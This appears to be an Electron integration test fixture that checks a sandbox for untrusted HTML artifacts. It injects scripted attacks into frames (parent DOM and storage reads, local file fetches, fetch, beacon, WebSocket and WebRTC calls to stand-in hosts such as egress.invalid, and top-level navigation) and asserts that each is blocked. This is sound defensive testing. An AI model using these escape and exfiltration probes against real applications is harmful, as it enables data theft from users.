'use strict';

// Real Electron + production security module/preload, synthetic local host.
// This deliberately does NOT claim to load the production conversation UI.
const { app, BrowserWindow, ipcMain, session } = require('electron');
const fs = require('node:fs'), path = require('node:path'), http = require('node:http');
const net = require('node:net'), dgram = require('node:dgram'), crypto = require('node:crypto');
const { pathToFileURL } = require('node:url');
const { createHtmlArtifactSecurity, FRAME_NAME } = require('../../electron/html-artifact-security.cjs');
const root = path.resolve(process.env.HTML_ARTIFACT_WORLD);
for (const [name, directory] of Object.entries({ home: 'home', appData: 'appdata', userData: 'profile',
  sessionData: 'profile', temp: 'tmp', logs: 'logs' })) app.setPath(name, path.join(root, directory));
const report = { schemaVersion: 1, scope: 'real-electron-integration-fixture-not-production-ui',
  completed: false, failed: 0, checks: [], facts: {}, stage: 'bootstrap' };
const save = () => fs.writeFileSync(path.join(root, 'report.json'), JSON.stringify(report, null, 2) + '\n');
const stage = value => { report.stage = value; save(); };
function check(id, pass, details) {
  report.checks.push({ id, pass: Boolean(pass), ...(details === undefined ? {} : { details }) });
  if (!pass) report.failed++;
  save(); if (!pass) throw Error('check_failed');
}
const pause = ms => new Promise(resolve => setTimeout(resolve, ms));
async function until(fn, timeout = 10000) {
  const end = Date.now() + timeout;
  while (Date.now() < end) { if (await fn()) return; await pause(25); }
  throw Error('condition_timeout');
}
const serialize = value => JSON.stringify(value).replace(/</g, '\\u003c');
const expression = (fn, ...args) => `(${fn.toString()})(...${serialize(args)})`;
const listen = server => new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
const hash = file => crypto.createHash('sha256').update(fs.readFileSync(file)).digest('hex');

// No CSP/bootstrap in this layer: native request/frame guards must stand on
// their own. RTC is tested separately with the real trusted srcdoc prefix.
async function nativeAttacks(config) {
  const r = { executed: true, require: typeof require, process: typeof process, Buffer: typeof Buffer,
    ipc: typeof ipcRenderer, preload: typeof piGuiDesktop, popup: window.open('about:blank') === null };
  const pending = [];
  const attempt = (name, fn) => {
    try { pending.push(Promise.resolve(fn()).then(() => { r[name] = 'resolved'; }, () => { r[name] = 'rejected'; })); }
    catch { r[name] = 'rejected'; }
  };
  const record = (name, fn) => { try { r[name] = fn(); } catch (e) { r[name] = e.name; } };
  const node = (tag, props = {}) => { const el = document.createElement(tag); Object.assign(el, props); document.body.append(el); return el; };
  window.name = 'renamed-artifact'; // name is NOT the authority after binding.
  record('parentDom', () => parent.document.body.textContent);
  record('parentPreload', () => typeof parent.piGuiDesktop);
  record('parentStorage', () => parent.localStorage.getItem('host-canary'));
  record('storage', () => { localStorage.setItem('x', 'synthetic'); return localStorage.getItem('x'); });
  record('sessionStorage', () => sessionStorage.getItem('x'));
  record('cookie', () => document.cookie);
  attempt('indexedDB', () => new Promise((resolve, reject) => { const q = indexedDB.open('synthetic'); q.onsuccess = resolve; q.onerror = reject; }));
  attempt('caches', () => caches.open('synthetic'));
  attempt('file', () => fetch(config.file));
  for (const [name, target] of Object.entries(config.targets)) {
    attempt('fetch-' + name, () => fetch(target + '/attack-fetch', { method: 'POST', body: 'synthetic', credentials: 'include' }));
    record('beacon-' + name, () => navigator.sendBeacon(target + '/attack-beacon', 'synthetic'));
    node('img', { src: target + '/attack-img' }); node('script', { src: target + '/attack-script' });
    node('link', { rel: 'stylesheet', href: target + '/attack-css' });
    node('iframe', { src: target + '/attack-iframe' });
    node('video', { src: target + '/attack-media', preload: 'auto' });
    node('link', { rel: 'preconnect', href: target }); node('link', { rel: 'dns-prefetch', href: target });
    const style = node('style'); style.textContent = `@import url('${target}/attack-import');body{background-image:url('${target}/attack-background')}`;
    attempt('ws-' + name, () => new Promise((resolve, reject) => {
      const ws = new WebSocket(target.replace(/^http/, 'ws') + '/attack-ws');
      ws.onopen = () => { ws.close(); resolve(); }; ws.onerror = reject;
      setTimeout(() => { ws.close(); reject(); }, 600);
    }));
  }
  record('topNavigation', () => { top.location.href = config.targets.app + '/attack-top'; return 'assigned'; });
  record('form', () => { const f = node('form', { action: config.targets.app + '/attack-form', method: 'POST' }); f.submit(); return 'submitted'; });
  record('download', () => { const a = node('a', { href: URL.createObjectURL(new Blob(['synthetic'])), download: 'must-not-download.txt' }); a.click(); return 'clicked'; });
  await Promise.race([Promise.allSettled(pending), new Promise(resolve => setTimeout(resolve, 1200))]);
  window.attackResult = r;
}

async function prefixAttacks(config) {
  const r = { executed: true }, locked = ['RTCPeerConnection', 'webkitRTCPeerConnection', 'RTCIceTransport',
    'WebTransport', 'WebSocket', 'WebSocketStream', 'Worker', 'SharedWorker', 'BroadcastChannel', 'fetch', 'XMLHttpRequest'];
  r.locked = locked.every(name => {
    const descriptor = Object.getOwnPropertyDescriptor(window, name);
    try { Object.defineProperty(window, name, { value: function () {} }); } catch {}
    return typeof window[name] === 'undefined' && descriptor?.configurable === false && descriptor?.writable === false;
  });
  let udpAttempt = false, tcpAttempt = false;
  for (const [name, url] of [['udp', config.stun], ['tcp', config.turn]]) {
    try {
      if (name === 'udp') udpAttempt = true; else tcpAttempt = true;
      const peer = new RTCPeerConnection({ iceServers: [{ urls: url, username: 'synthetic', credential: 'synthetic' }] });
      peer.createDataChannel('test'); await peer.setLocalDescription(await peer.createOffer()); peer.close(); r[name] = 'allowed';
    } catch { r[name] = 'rejected'; }
  }
  r.rtcAttempted = udpAttempt && tcpAttempt;
  for (const tag of ['iframe', 'object']) {
    const child = document.createElement(tag); document.body.append(child);
    try { r[tag + 'Realm'] = typeof child.contentWindow.RTCPeerConnection; } catch (e) { r[tag + 'Realm'] = e.name; }
    child.remove();
  }
  r.windowPrototype = typeof Object.getPrototypeOf(window).RTCPeerConnection;
  const child = document.createElement('iframe');
  child.srcdoc = '<script>(' + (async function (config) {
    const result = { nestedExecuted: true, rtc: typeof RTCPeerConnection };
    const peers = [];
    for (const [name, url] of [['udp', config.stun], ['tcp', config.turn]]) {
      try {
        const peer = new RTCPeerConnection({ iceServers: [{ urls: url, username: 'synthetic', credential: 'synthetic' }] });
        peers.push(peer); peer.createDataChannel('probe');
        await peer.setLocalDescription(await peer.createOffer()); result[name] = 'started';
      } catch { result[name] = 'rejected'; }
    }
    await new Promise(resolve => setTimeout(resolve, 1200));
    for (const peer of peers) peer.close();
    parent.postMessage(result, '*');
  }).toString() + ')(' + JSON.stringify({ stun: config.stun, turn: config.turn }) + ')<\/script>';
  addEventListener('message', event => { if (event.data?.nestedExecuted) { r.nestedExecuted = true; r.nestedRtc = event.data; } });
  document.body.append(child);
  try { document.domain = '127.0.0.1'; r.domain = 'allowed'; } catch (e) { r.domain = e.name; }
  try { r.filePicker = await showOpenFilePicker(); } catch (e) { r.filePicker = e.name; }
  await new Promise(resolve => setTimeout(resolve, 900));
  r.nestedExecuted = r.nestedExecuted === true;
  window.attackResult = r;
}

save();
app.whenReady().then(run).catch(error => {
  report.failed++; report.failure = { code: error.message === 'check_failed' ? 'check_failed' : 'fixture_failed' };
  save(); app.exit(1);
});

async function run() {
  let win, security, udp, tcp, host, sink, networkLogActive = false;
  const networkLogPath = path.join(root, 'synthetic-network-observation.json');
  let udpArrivals = 0, tcpArrivals = 0;
  const arrivals = [], sentHeaders = [], failures = [];
  const token = crypto.randomBytes(32).toString('hex');
  try {
    stage('local-sinks');
    sink = http.createServer((req, res) => {
      arrivals.push({ route: 'sink', attack: req.url.startsWith('/attack-'), token: req.headers['x-pi-gui-token'] === token });
      res.writeHead(200, { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Headers': '*' }); res.end('sink');
    });
    await listen(sink);
    udp = dgram.createSocket('udp4'); udp.on('message', () => { udpArrivals++; });
    await new Promise(resolve => udp.bind(0, '127.0.0.1', resolve));
    tcp = net.createServer(socket => { tcpArrivals++; socket.destroy(); }); await listen(tcp);
    // Positive sink controls prove the observers really receive traffic.
    const control = dgram.createSocket('udp4');
    await new Promise(resolve => control.send('control', udp.address().port, '127.0.0.1', resolve)); control.close();
    await new Promise(resolve => { const socket = net.connect(tcp.address().port, '127.0.0.1'); socket.on('close', resolve); });
    await until(() => udpArrivals === 1 && tcpArrivals === 1);
    check('network-observers-positive-control', true); udpArrivals = tcpArrivals = 0;
    const sinkOrigin = 'http://127.0.0.1:' + sink.address().port;
    host = http.createServer((req, res) => {
      const authenticated = req.headers['x-pi-gui-token'] === token;
      arrivals.push({ route: req.url.split('?')[0], attack: req.url.startsWith('/attack-'), token: authenticated });
      if (req.url === '/redirect') { res.writeHead(302, { Location: sinkOrigin + '/redirect-target' }); return res.end(); }
      if (req.url === '/office-script') { res.writeHead(200, { 'Content-Type': 'text/javascript' }); return res.end('window.officeLoaded=true'); }
      if (req.url === '/api/main') { res.setHeader('Content-Type', 'application/json'); return res.end(JSON.stringify({ ok: authenticated })); }
      res.setHeader('Content-Type', 'text/html');
      res.end('<!doctype html><meta charset="utf-8"><body><h1>Electron artifact security fixture</h1></body>');
    });
    await listen(host);
    const origin = 'http://127.0.0.1:' + host.address().port;
    security = createHtmlArtifactSecurity({ getWindow: () => win, origin, hasSwitch: name => app.commandLine.hasSwitch(name) });
    security.installIpc(ipcMain); security.installSessionGuards(session.defaultSession);
    security.installRequestGuards(session.defaultSession, { token, tokenHeader: 'X-Pi-Gui-Token', backendConnected: () => true });
    session.defaultSession.webRequest.onSendHeaders({ urls: ['<all_urls>'] }, details => {
      sentHeaders.push({ artifact: security.isArtifactFrame(details.frame, win?.webContents),
        token: Object.entries(details.requestHeaders).some(([key, value]) => key.toLowerCase() === 'x-pi-gui-token' && value === token),
        route: new URL(details.url).pathname });
    });
    session.defaultSession.webRequest.onErrorOccurred({ urls: ['<all_urls>'] }, details => {
      failures.push({ artifact: security.isArtifactFrame(details.frame, win?.webContents), type: details.resourceType,
        blocked: details.error === 'net::ERR_BLOCKED_BY_CLIENT' });
    });
    win = new BrowserWindow({ show: false, webPreferences: {
      sandbox: true, webSecurity: true, contextIsolation: true, nodeIntegration: false,
      nodeIntegrationInSubFrames: false, nodeIntegrationInWorker: false, webviewTag: false,
      allowRunningInsecureContent: false, preload: path.join(__dirname, '../../electron/preload.cjs'),
    } });
    security.attachWebContents(win.webContents);
    const evaluate = (fn, ...args) => win.webContents.executeJavaScript(expression(fn, ...args));
    const frameById = id => win.webContents.mainFrame.framesInSubtree.find(frame => frame.frameTreeNodeId === id);
    await win.loadURL(origin);
    stage('host-positive-controls');
    const prefs = win.webContents.getLastWebPreferences();
    report.facts = { electron: process.versions.electron, chrome: process.versions.chrome, platform: process.platform,
      mainSha256: hash(path.join(__dirname, '../../electron/main.cjs')),
      securitySha256: hash(path.join(__dirname, '../../electron/html-artifact-security.cjs')),
      preloadSha256: hash(path.join(__dirname, '../../electron/preload.cjs')),
      frameModuleSha256: hash(process.env.HTML_ARTIFACT_FRAME_MODULE), productionUi: false };
    check('normal-host-sandbox', prefs.sandbox === true && prefs.contextIsolation === true && prefs.webSecurity === true
      && !app.commandLine.hasSwitch('no-sandbox') && !app.commandLine.hasSwitch('remote-debugging-port'));
    check('trusted-main-api-token', await evaluate(async () => (await (await fetch('/api/main')).json()).ok));
    check('production-preload-main-bridge', await evaluate(() => piGuiDesktop.isDesktop && typeof piGui.htmlArtifacts.registerFrame === 'function'));
    await evaluate(async () => { localStorage.setItem('host-canary', 'synthetic'); try { await fetch('/redirect'); } catch {} });
    await until(() => arrivals.some(a => a.route === 'sink'));
    check('redirect-never-leaks-token', arrivals.filter(a => a.route === 'sink').every(a => !a.token));
    await evaluate(() => { const f = document.createElement('iframe'); f.id = 'office'; f.sandbox = 'allow-scripts';
      f.srcdoc = '<script src="/office-script"><\/script>'; document.body.append(f); });
    await until(() => arrivals.some(a => a.route === '/office-script'));
    const office = win.webContents.mainFrame.framesInSubtree.find(f => f.name !== FRAME_NAME && f.url === 'about:srcdoc');
    await until(() => office.executeJavaScript('window.officeLoaded === true'));
    check('office-static-script-loads-without-token', arrivals.filter(a => a.route === '/office-script').every(a => !a.token));
    await evaluate(() => document.getElementById('office').remove());

    const mount = async (id, html) => {
      const previous = new Set(win.webContents.mainFrame.framesInSubtree.map(f => f.frameTreeNodeId));
      const result = await evaluate(async id => {
        const f = document.createElement('iframe'); f.id = id; f.name = 'pi-gui-html-artifact'; f.setAttribute('sandbox', ''); document.body.append(f);
        return piGui.htmlArtifacts.registerFrame({ name: 'pi-gui-html-artifact' });
      }, id);
      check('register-' + id, result?.ok === true && result?.javascriptEnabled === true, result);
      const frame = win.webContents.mainFrame.framesInSubtree.find(f => !previous.has(f.frameTreeNodeId) && f.name === FRAME_NAME);
      if (!frame) throw Error('missing_frame');
      await evaluate((id, html) => { const frame = document.getElementById(id); frame.sandbox = 'allow-scripts'; frame.srcdoc = html; }, id, html);
      await until(() => frameById(frame.frameTreeNodeId)?.url === 'about:srcdoc');
      return frame.frameTreeNodeId;
    };
    stage('native-frame-attacks-without-csp');
    await session.defaultSession.netLog.startLogging(networkLogPath);
    networkLogActive = true;
    await session.defaultSession.resolveHost('localhost'); // Offline resolver observation positive control.
    const config = { file: pathToFileURL(path.join(root, 'synthetic-file.txt')).href,
      stun: 'stun:127.0.0.1:' + udp.address().port,
      turn: 'turn:127.0.0.1:' + tcp.address().port + '?transport=tcp',
      targets: { app: origin, loopback: sinkOrigin, localhost: sinkOrigin.replace('127.0.0.1', 'localhost'),
        tcp: 'http://127.0.0.1:' + tcp.address().port,
        private: 'http://10.255.255.254:18000', external: 'https://egress.invalid:18000' } };
    const nativeId = await mount('native', '<!doctype html><body><script>(' + nativeAttacks.toString() + ')(' + serialize(config) + ')</script>');
    await until(() => frameById(nativeId).executeJavaScript('!!window.attackResult'));
    const native = await frameById(nativeId).executeJavaScript('window.attackResult');
    check('untrusted-inline-js-really-executed', native.executed === true);
    check('artifact-no-preload-node-ipc', ['require', 'process', 'Buffer', 'ipc', 'preload'].every(key => native[key] === 'undefined'));
    check('artifact-cannot-read-parent-dom-preload-storage', ['parentDom', 'parentPreload', 'parentStorage'].every(key => native[key] === 'SecurityError'));
    check('opaque-storage-cookie-indexeddb-cache-denied', ['storage', 'sessionStorage', 'cookie'].every(key => native[key] === 'SecurityError')
      && native.indexedDB === 'rejected' && native.caches === 'rejected', native);
    check('automatic-local-file-read-denied', native.file === 'rejected');
    check('all-fetch-and-websocket-attempts-rejected', Object.keys(config.targets).every(name => native['fetch-' + name] === 'rejected' && native['ws-' + name] === 'rejected'));
    await pause(250);
    check('no-host-localhost-private-external-egress', arrivals.filter(a => a.attack).length === 0
      && !sentHeaders.some(item => item.artifact || item.route.startsWith('/attack-')));
    check('native-preconnect-did-not-open-a-tcp-socket', tcpArrivals === 0, { tcpArrivals });
    check('blocked-requests-never-carried-token', sentHeaders.every(item => !item.artifact)
      && arrivals.filter(a => a.attack).every(a => !a.token));
    check('native-block-observer-saw-real-denials', failures.filter(f => f.artifact && f.blocked).length >= 5,
      { deniedRequests: failures.filter(f => f.artifact && f.blocked).length, resourceTypes: [...new Set(failures.filter(f => f.artifact).map(f => f.type))] });
    check('popup-and-top-navigation-denied', native.popup && native.topNavigation === 'SecurityError' && win.webContents.getURL() === origin + '/');
    check('renamed-artifact-retains-native-identity', frameById(nativeId).name !== FRAME_NAME && security.isArtifactFrame(frameById(nativeId), win.webContents));
    check('real-child-frame-cannot-authorize-ipc', !security.isTrustedSender({ sender: win.webContents, senderFrame: frameById(nativeId), isMainFrame: true })
      && security.guardHandler(() => 'bad')({ sender: win.webContents, senderFrame: frameById(nativeId) }).code === 'untrusted_sender');
    await evaluate(async () => piGui.htmlArtifacts.releaseFrame({ name: 'pi-gui-html-artifact' }));
    check('release-of-live-frame-does-not-remove-guards', security.shouldBlockRequest({ frame: frameById(nativeId), webContents: win.webContents, url: origin + '/api/main' }));

    stage('production-srcdoc-prefix-attacks');
    const frameModule = await import(pathToFileURL(process.env.HTML_ARTIFACT_FRAME_MODULE).href);
    const wrapped = frameModule.htmlArtifactDocument('<script>(' + prefixAttacks.toString() + ')(' + serialize(config) + ')</script>', {
      id: 'a'.repeat(64), nonce: 'b'.repeat(32), hostOrigin: origin, theme: { colorScheme: 'dark', values: {} },
    });
    const prefixId = await mount('prefix', wrapped);
    await until(() => frameById(prefixId).executeJavaScript('!!window.attackResult'));
    const prefix = await frameById(prefixId).executeJavaScript('window.attackResult');
    check('real-prefix-all-constructor-locks-nonconfigurable', prefix.executed === true && prefix.locked === true);
    check('stun-turn-construction-rejected-after-real-attempts', prefix.rtcAttempted && prefix.udp === 'rejected' && prefix.tcp === 'rejected');
    check('stun-udp-and-turn-tcp-zero-arrivals', udpArrivals === 0 && tcpArrivals === 0, { udpArrivals, tcpArrivals });
    check('nested-blank-object-and-prototype-cannot-recover-rtc', prefix.iframeRealm === 'SecurityError'
      && prefix.objectRealm !== 'function' && prefix.windowPrototype === 'undefined' && !prefix.nestedExecuted, prefix);
    check('opaque-domain-and-file-picker-denied', prefix.domain === 'SecurityError' && prefix.filePicker === 'SecurityError');
    check('multiple-same-name-frames-remain-independent', frameById(nativeId).frameTreeNodeId !== frameById(prefixId).frameTreeNodeId
      && security.isArtifactFrame(frameById(nativeId), win.webContents) && security.isArtifactFrame(frameById(prefixId), win.webContents));
    for (const [label, url] of [['blank', 'about:blank'], ['data', 'data:text/html,escape'], ['host', origin + '/attack-self'],
      ['file', config.file], ['external', config.targets.external + '/attack-self']]) {
      await frameById(prefixId).executeJavaScript('location.href = ' + serialize(url)).catch(() => {});
      await pause(100);
      check('self-navigation-denied-' + label, frameById(prefixId)?.url === 'about:srcdoc');
    }
    const beforeOpen = await frameById(prefixId).executeJavaScript(`document.open();document.write('<body>replacement</body>');document.close();
      ({rtc:typeof RTCPeerConnection, fetch:typeof fetch})`);
    check('document-open-cannot-restore-network-constructors', beforeOpen.rtc === 'undefined' && beforeOpen.fetch === 'undefined');
    check('trusted-main-api-still-authenticated-after-attacks', await evaluate(async () => (await (await fetch('/api/main')).json()).ok));

    stage('download-ownership');
    const downloads = [];
    session.defaultSession.on('will-download', event => {
      downloads.push(event.defaultPrevented === true);
      // Safety only: record the production decision first, then ensure even a
      // failed regression cannot write outside this TEMP fixture or open UI.
      event.preventDefault();
    });
    const download = () => evaluate(() => {
      const a = document.createElement('a'); a.download = 'synthetic.txt'; a.href = URL.createObjectURL(new Blob(['synthetic']));
      document.body.append(a); a.click(); a.remove(); URL.revokeObjectURL(a.href);
    });
    await download(); await until(() => downloads.length === 1);
    check('native-download-gate-denies-while-any-artifact-lives', downloads[0]);
    await evaluate(async () => {
      document.getElementById('native').remove(); document.getElementById('prefix').remove();
      return piGui.htmlArtifacts.releaseFrame({ name: 'pi-gui-html-artifact' });
    });
    await download(); await until(() => downloads.length === 2);
    check('host-download-policy-restored-after-all-artifacts-removed', !downloads[1]);
    check('no-denied-request-ever-reached-a-token-bearing-sink', !arrivals.some(a => a.attack) && !sentHeaders.some(item => item.artifact));
    await session.defaultSession.netLog.stopLogging(); networkLogActive = false;
    const networkLog = JSON.parse(fs.readFileSync(networkLogPath, 'utf8'));
    const eventNames = Object.fromEntries(Object.entries(networkLog.constants.logEventTypes).map(([name, id]) => [id, name]));
    const resolverEvents = networkLog.events.filter(event => /HOST_RESOLVER.*REQUEST/.test(eventNames[event.type] || '') && event.params?.host);
    check('dns-observation-positive-control', resolverEvents.some(event => String(event.params.host).includes('localhost')));
    check('dns-prefetch-no-untrusted-resolution', !resolverEvents.some(event => String(event.params.host).includes('egress.invalid')),
      { resolverEvents: resolverEvents.length, forbiddenResolverEvents: resolverEvents.filter(event => String(event.params.host).includes('egress.invalid')).length });
    report.observation = { arrivalCount: arrivals.length, tokenBearingHostRequests: arrivals.filter(a => a.token).length,
      blockedRequests: failures.filter(f => f.blocked).length, artifactSendHeaders: sentHeaders.filter(h => h.artifact).length,
      udpArrivals, tcpArrivals, downloadsDenied: downloads.filter(Boolean).length };
    report.completed = report.failed === 0;
  } catch (error) {
    if (error.message !== 'check_failed') report.failed++;
    report.failure = { code: ['check_failed', 'condition_timeout', 'missing_frame'].includes(error.message) ? error.message : 'fixture_failed',
      stage: report.stage, exception: error.name };
  } finally {
    stage('cleanup');
    security?.dispose();
    if (win && !win.isDestroyed()) win.destroy();
    if (udp) udp.close();
    for (const server of [tcp, host, sink]) if (server) { server.closeAllConnections?.(); await new Promise(resolve => server.close(resolve)); }
    report.cleanup = { windowDestroyed: !win || win.isDestroyed(), localServersClosed: true };
    save(); app.exit(report.completed && !report.failed ? 0 : 1);
  }
}
